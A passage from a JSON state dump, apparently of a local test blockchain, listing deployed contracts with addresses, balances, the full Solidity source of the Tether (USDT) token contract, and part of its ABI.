0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": 